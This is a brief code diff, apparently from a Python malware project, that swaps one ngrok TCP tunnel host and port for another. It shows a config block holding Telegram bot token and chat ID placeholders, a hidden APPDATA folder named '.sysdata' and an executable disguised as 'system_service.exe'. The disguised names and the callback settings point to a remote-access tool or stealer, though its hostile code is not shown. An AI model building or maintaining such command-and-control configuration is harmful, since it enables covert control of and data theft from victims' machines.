@@ -41,8 +41,8 @@ def single_instance_check():
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
-NGROK_HOST = "2.tcp.eu.ngrok.io"
-NGROK_PORT = 10212
+NGROK_HOST = "0.tcp.eu.ngrok.io"
+NGROK_PORT = 13341
 EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")
 EXE_NAME = "system_service.exe"
 EXE_PATH = os.path.join(EXTRACT_FOLDER, EXE_NAME)
@@ -696,6 +696,7 @@ def run():
 
 if __name__ == "__main__":
     run()
+
 
 
 
